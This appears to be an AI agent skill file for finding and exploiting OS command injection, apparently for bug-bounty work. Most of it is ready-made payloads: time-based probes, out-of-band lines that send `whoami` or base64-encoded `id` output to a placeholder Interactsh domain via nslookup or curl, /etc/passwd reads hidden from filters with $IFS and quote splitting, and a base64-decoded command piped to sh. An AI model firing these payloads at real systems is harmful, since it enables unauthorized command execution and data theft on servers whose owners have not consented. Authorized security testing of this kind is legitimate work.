---
name: bbp-osci-hunter
description: Specialized skill for finding and exploiting OS Command Injection vulnerabilities, focusing on blind and out-of-band techniques.
---

# OS Command Injection Hunter Skill

This skill provides methodologies for identifying and exploiting instances where an application passes unsafe user-supplied data to a system shell.

## Workflow

### 1. Identifying Injection Points
Look for parameters that might interact with the underlying operating system:
- Exporting/converting files (PDF generators, image processors like ImageMagick).
- Network diagnostic tools (ping, traceroute, dig).
- System administration panels (restarting services, managing backups).

### 2. Injecting Shell Metacharacters
Append command separators to the input. If the backend is Linux/Unix, use:
- `;` (Sequential execution)
- `|` (Piped execution)
- `&&` (AND conditional execution)
- `||` (OR conditional execution)
- `$()` or `\` \`` (Inline execution/Command Substitution)

### 3. Blind / Time-Based Command Injection
Often, the output of the injected command is not returned in the HTTP response. Use time delays to infer if the command executed.
- **Linux:** `; sleep 10;` or `| ping -c 10 127.0.0.1 |`
- **Windows:** `& ping -n 10 127.0.0.1 &` or `| timeout 10 |`

### 4. Out-of-Band (OAST) Command Injection
The most reliable way to confirm blind command injection is to make the server reach out to an external server you control (like Interactsh).
- **DNS Exfiltration:** `; nslookup $(whoami).your-interactsh-domain.com ;` (If successful, your Interactsh client will show a DNS request from `root.your-interactsh-domain.com` or similar).
- **HTTP/cURL:** `| curl http://your-interactsh-domain.com/$(id | base64) |`
- **Wget:** `& wget http://your-interactsh-domain.com &`

### 5. Bypassing Filters (WAF / Sanitization)
- **Space Bypass:** Use `$IFS` (Internal Field Separator) or brace expansion: `;cat$IFS/etc/passwd;` or `{cat,/etc/passwd}`
- **Blacklisted Commands:** Bypass keyword filters by inserting quotes or using variables:
  - `c"a"t /etc/passwd`
  - `c'a't /etc/passwd`
  - `a=c; b=at; $a$b /etc/passwd`
- **Encoding:** Encode the payload in Base64 and decode it on the fly: `; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh ;`
